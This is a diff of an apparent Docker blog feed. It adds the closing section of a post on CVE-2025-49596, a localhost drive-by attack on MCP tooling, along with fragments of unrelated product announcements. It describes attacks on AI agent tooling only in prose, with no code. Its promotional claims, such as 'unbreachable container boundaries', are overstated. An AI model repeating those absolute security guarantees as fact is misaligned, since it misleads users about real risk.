+<h2 class="wp-block-heading"><strong>Best Practices for Localhost Security</strong></h2>
+<ol class="wp-block-list">
+<li><strong>Eliminate Browser-Accessible Endpoints</strong>: Use Docker MCP Gateway&#8217;s stdio transport instead of web interfaces</li>
+<li><strong>Require Authentication</strong>: Never expose unauthenticated services to localhost</li>
+<li><strong>Implement Network Isolation</strong>: Use container networking to prevent external access</li>
+<li><strong>Monitor Localhost Activity</strong>: Enable comprehensive logging of all MCP communications</li>
+<li><strong>Apply Zero-Trust Principles</strong>: Treat localhost as untrusted network space</li>
+<li><strong>Regular Security Updates</strong>: Keep Docker MCP Gateway updated with latest security patches</li>
+<li><strong>Use Interceptors</strong>: Deploy attack detection interceptors for additional protection</li>
+</ol>
+<h2 class="wp-block-heading"><strong>Take Action: Secure Your Development Environment Today</strong></h2>
+<p>The path to secure MCP development starts with eliminating localhost attack surfaces:</p>
+<ol class="wp-block-list">
+<li><strong>Upgrade MCP Inspector:</strong> Update to version 0.14.1+ immediately using `npm install`</li>
+<li><strong>Deploy Secure Alternatives</strong>: <a href="https://hub.docker.com/mcp" rel="nofollow noopener" target="_blank"><strong>Browse the Docker MCP Catalog</strong></a> to find containerized, security-hardened MCP servers that eliminate localhost vulnerabilities</li>
+<li><strong>Enable Network Isolation</strong>: <a href="https://www.docker.com/products/docker-desktop/"><strong>Install Docker Desktop</strong></a> and deploy MCP servers in isolated containers with comprehensive network controls</li>
+</ol>
+<h2 class="wp-block-heading">Join the Secure Ecosystem</h2>
+<ol class="wp-block-list">
+<li><strong>Submit Your MCP Server</strong> to help build the secure, containerized MCP ecosystem free from drive-by attack vectors. Check our <a href="https://github.com/docker/mcp-registry/blob/main/CONTRIBUTING.md" rel="nofollow noopener" target="_blank">submission guidelines</a>.</li>
+<li>Stay updated: <a href="https://github.com/docker/mcp-gateway" rel="nofollow noopener" target="_blank">Star our repository</a> for the latest security updates and threat intelligence</li>
+<li>Read previous Issues: <a href="https://www.docker.com/blog/mcp-security-issues-threatening-ai-infrastructure/">Issue 1</a>, <a href="https://www.docker.com/blog/mcp-horror-stories-the-supply-chain-attack/">Issue 2</a> and <a href="https://www.docker.com/blog/mcp-horror-stories-github-prompt-injection/">Issue 3</a> of this MCP Horror Stories series</li>
+</ol>
+<h3 class="wp-block-heading">Conclusion</h3>
+<p>CVE-2025-49596 exposes a chilling reality: in the traditional MCP ecosystem, simply browsing the web becomes a system compromise vector. A single malicious website can silently hijack your development environment, steal credentials, and establish persistent backdoors—all through everyday activities that every developer performs hundreds of times daily.</p>
+<p>But this horror story also reveals the power of security-first architecture. Docker MCP Gateway doesn&#8217;t just patch this specific vulnerability—it eliminates entire classes of localhost-based attacks through network isolation, container security, and intelligent monitoring. When drive-by attacks inevitably target your development environment, you get proactive defense rather than discovering the breach weeks later.</p>
+<p>The era of hoping that localhost services won&#8217;t be discovered and exploited is over. Network isolation and zero-trust architecture are here.</p>
+<p><strong>Coming up in our series:</strong> MCP Horror Stories issue 5 explores &#8220;The AI Agent Container Breakout&#8221; – how sophisticated attackers combine tool poisoning with container escape techniques to achieve full system compromise, and how Docker&#8217;s defense-in-depth security controls create unbreachable container boundaries that stop even the most advanced privilege escalation attacks.</p>
+<h3 class="wp-block-heading">Learn More</h3>
+<ul class="wp-block-list">
+<li><a href="https://hub.docker.com/mcp" rel="nofollow noopener" target="_blank"><strong>Explore the MCP Catalog</strong></a>: Discover containerized, security-hardened MCP servers</li>
+<li><a href="https://www.docker.com/products/docker-desktop/"><strong>Download Docker Desktop</strong></a>: Get immediate access to secure localhost isolation and container networking</li>
+<li><a href="https://github.com/docker/mcp-registry" rel="nofollow noopener" target="_blank"><strong>Submit Your Server</strong></a>: Help build the secure, containerized MCP ecosystem. Check our submission guidelines for more.</li>
+<li><a href="https://github.com/docker/mcp-gateway" rel="nofollow noopener" target="_blank"><strong>Follow Our Progress</strong></a>: Star our repository for the latest security updates and threat intelligence</li>
+<li><strong>Read </strong><a href="https://www.docker.com/blog/mcp-security-issues-threatening-ai-infrastructure/"><strong>issue 1</strong></a><strong>, </strong><a href="https://www.docker.com/blog/mcp-horror-stories-the-supply-chain-attack/"><strong>issue 2</strong></a><strong>, and </strong><a href="https://www.docker.com/blog/mcp-horror-stories-github-prompt-injection/"><strong>issue 3</strong></a> of this MCP Horror Stories series</li>
+</ul>
 Silent Component Updates & Redesigned Update Experience
 https://www.docker.com/blog/docker-desktop-silent-component-updates/
 Kat Tomrushka
@@ -68,7 +648,7 @@ Following on from our previous initiative to improve how Docker Desktop delivers
 <li>Toggle &#8220;Automatically update components&#8221; on or off</li>
 </ol>
 <div class="wp-block-ponyo-image">
-<img fetchpriority="high" decoding="async" width="1222" height="961" src="https://www.docker.com/app/uploads/2025/09/image3.png" class="attachment-full size-full" alt="image3" srcset="https://www.docker.com/app/uploads/2025/09/image3.png 1222w, https://www.docker.com/app/uploads/2025/09/image3-381x300.png 381w, https://www.docker.com/app/uploads/2025/09/image3-1110x873.png 1110w" sizes="(max-width: 1222px) 100vw, 1222px" title="- image3">
+<img decoding="async" width="1222" height="961" src="https://www.docker.com/app/uploads/2025/09/image3.png" class="attachment-full size-full" alt="image3" srcset="https://www.docker.com/app/uploads/2025/09/image3.png 1222w, https://www.docker.com/app/uploads/2025/09/image3-381x300.png 381w, https://www.docker.com/app/uploads/2025/09/image3-1110x873.png 1110w" sizes="(max-width: 1222px) 100vw, 1222px" title="- image3">
 </div>
 <p><em>Software updates: new setting to control opt in or out of automatic component updates.</em><br></p>
 <h3 class="wp-block-heading"><strong>Enterprise Management</strong></h3>
@@ -1165,25 +1745,4 @@ run: docker scout cves my-agent:latest
 </ul>
 <p></p>
 <p>Let’s build fast, and safely.</p>
-<p></p>
-Docker Acquisition of MCP Defender Helps Meet Challenges of Securing the Agentic Future
-https://www.docker.com/blog/docker-acquires-mcp-defender-ai-agent-security/
-Andy Ramirez
-Fri, 05 Sep 2025 13:00:00 +0000
-Company
-Agentic apps
-Docker
-MCP
-https://www.docker.com/?p=76255
-Docker, Inc.®, a provider of cloud-native and AI-native development tools, infrastructure, and services, today announced the acquisition of MCP Defender, a company founded to secure AI applications. The rapid evolution of AI-from simple generative models to powerful agentic tools-has transformed software development in extraordinary ways. But as with all powerful technologies, new capabilities bring new...
-<p>Docker, Inc.®, a provider of cloud-native and AI-native development tools, infrastructure, and services, today announced the acquisition of MCP Defender, a company founded to secure AI applications.</p>
-<p>The rapid evolution of AI-from simple generative models to powerful agentic tools-has transformed software development in extraordinary ways. But as with all powerful technologies, new capabilities bring new security challenges. <a href="https://www.docker.com/blog/mcp-security-issues-threatening-ai-infrastructure/">We recently highlighted critical MCP security issues on the Docker blog</a>, emphasizing how essential it is to secure our emerging AI infrastructure. Building on that discussion, we want to offer our perspective on the current state of AI security, outline its trajectory, consider what this means for organizations developing AI agents and tools, and explore Docker&#8217;s vision for securely empowering these new AI workloads.</p>
-<p></p>
-<p>Today’s AI security landscape mirrors the early days of container adoption: rapid innovation, widespread enthusiasm, but significant uncertainty around risks. AI agents now routinely execute critical tasks &#8211; from automated code generation and system administration to customer interaction &#8211; often interfacing directly with sensitive data and critical infrastructure. The security stakes have never been higher.</p>
-<p></p>
-<p>Looking ahead, securing AI infrastructure will require a significant shift towards runtime monitoring, real-time threat detection, and continuous security evaluation. Organizations will increasingly adopt tools designed specifically to detect and respond dynamically to threats occurring at runtime. Instead of relying solely on preventative measures, security strategies will embrace active monitoring and intelligent automation.</p>
-<p></p>
-<p>For companies developing AI agents and MCP tools, these security shifts are profound. Security can no longer be a late-stage consideration-it must be embedded from the earliest design phase. These solutions must transparently enforce policies, providing clear guardrails that reduce the cognitive load on development teams. Security for AI agents should be frictionless &#8211; built seamlessly into the workflows developers already use every day.</p>
-<p></p>
-<p>Docker’s mission has always been to simplify application development while ensuring security and portability. Extending that mission to agentic AI means integrating security deeply into the infrastructure itself. Docker’s vision is clear: secure-by-default AI infrastructure where every interaction is automatically verified, every threat proactively detected, and every policy transparently enforced. Docker’s commitment to security extends beyond AI, with products such as Docker Scout and Docker Hardened Images.</p>
 <p></p>
